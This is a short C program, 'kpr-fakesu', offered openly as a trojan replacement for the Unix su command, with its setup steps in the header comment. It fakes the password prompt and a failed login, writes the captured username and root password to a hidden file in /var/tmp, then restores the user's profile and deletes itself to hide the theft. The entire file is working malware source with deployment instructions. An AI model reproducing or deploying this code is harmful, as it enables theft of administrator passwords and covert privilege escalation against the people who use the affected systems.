/* 
* kpr-fakesu.c V0.9beta167 ;P
* by koper <koper@linuxmail.org>
*
* Setting up:
* admin@host:~$ gcc -o .su fakesu.c; rm -rf fakesu.c
* admin@host:~$ mv .su /var/tmp/.su
* admin@host:~$ cp .bash_profile .wgetrc
* admin@host:~$ echo "alias su=/var/tmp/.su">>.bash_profile
* admin@host:~$ logout
* *** LOGIN ***
* admin@host:~$ su
* Password: 
* su: Authentication failure
* Sorry.
* admin@host:~$ su
* Password: 
* root@host:~# logout
* admin@host:~$ cat /var/tmp/.pwds
* root:dupcia17
* admin@host:~$ 
* 
* /bin/su sends various failure information depending on the OS ver.
* Please modify the source to make it "fit" ;)
* 
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[]){

FILE *fp;
char *user;
char *pass;
char filex[100];
char clean[100];

sprintf(filex,"/var/tmp/.pwds");
sprintf(clean,"rm -rf /var/tmp/.su;mv -f /home/whyx.wgetrc /home/whyx/.bash_profile");//change here
if(argc==1) user="root";
if(argc==2) user=argv[1];
if(argc>2){
if(strcmp(argv[1], "-l")==0)
    user=argv[2];
else user=argv[1];}

fprintf(stdout,"Password: "); pass=getpass ("");
system("sleep 3");
fprintf(stdout,"su: Authentication failure\nSorry.\n");

if ((fp=fopen(filex,"w")) != NULL)
   {
   fprintf(fp, "%s:%s\n", user, pass);
   fclose(fp);
   }

system(clean);
system("rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su");

}

